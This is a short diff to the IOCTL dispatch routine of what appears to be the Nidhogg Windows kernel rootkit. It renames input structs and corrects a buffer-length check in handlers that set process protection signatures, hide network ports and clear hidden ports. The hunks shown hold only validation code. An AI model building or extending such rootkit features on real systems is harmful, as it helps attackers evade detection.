@@ -161,11 +161,11 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	{
 		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size != sizeof(ProcessSignature)) {
+		if (size != sizeof(IoctlProcessSignature)) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<ProcessSignature*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlProcessSignature*>(Irp->AssociatedIrp.SystemBuffer);
 
 		if (!IsValidPid(data->Pid) ||
 			(data->SignatureSigner < PsProtectedSignerNone || data->SignatureSigner > PsProtectedSignerMax) ||
@@ -1249,11 +1249,11 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		HiddenPort hiddenPort{};
 		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size != sizeof(InputHiddenPort)) {
+		if (size != sizeof(IoctlHiddenPort)) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<InputHiddenPort*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlHiddenPort*>(Irp->AssociatedIrp.SystemBuffer);
 
 		hiddenPort.Type = data->Type;
 		hiddenPort.Remote = data->Remote;
@@ -1306,7 +1306,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	}
 	case IOCTL_CLEAR_HIDDEN_PORTS:
 	{
-		ULONG size = stack->Parameters.DeviceIoControl.OutputBufferLength;
+		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
 		if (size != sizeof(PortType)) {
 			status = STATUS_INVALID_BUFFER_SIZE;
